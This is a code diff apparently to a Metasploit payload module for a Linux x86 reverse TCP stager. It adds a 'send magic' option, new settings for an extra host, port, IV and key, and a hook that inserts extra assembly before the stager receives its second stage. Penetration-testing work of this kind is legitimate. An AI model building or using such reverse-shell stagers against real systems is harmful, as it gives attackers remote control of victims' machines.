@@ -14,6 +14,8 @@ module Payload::Linux::ReverseTcp_x86
   include Msf::Payload::TransportConfig
   include Msf::Payload::Linux
   include Msf::Payload::Linux::SendUUID
+  include Msf::Payload::Linux::SendMagic
+  
 
   #
   # Generate the first stage
@@ -22,6 +24,10 @@ module Payload::Linux::ReverseTcp_x86
     conf = {
       port:          datastore['LPORT'],
       host:          datastore['LHOST'],
+      ihost:         datastore['IHOST'],
+      iport:         datastore['IPORT'],
+      iv:            datastore['IV'],
+      key:           datastore['KEY'],
       retry_count:   datastore['StagerRetryCount'],
       sleep_seconds: datastore['StagerRetryWait'],
     }
@@ -39,6 +45,10 @@ module Payload::Linux::ReverseTcp_x86
   # for certain payloads if requested.
   #
   def include_send_uuid
+    false
+  end
+
+  def include_send_magic
     false
   end
 
@@ -171,7 +181,11 @@ module Payload::Linux::ReverseTcp_x86
         int 0x80                  ; sys_mprotect
         test eax, eax
         js failed
+    ^
 
+    asm << asm_send_magic(opts) if include_send_magic
+
+    asm << %Q^
       recv:
         pop ebx
         mov ecx, esp
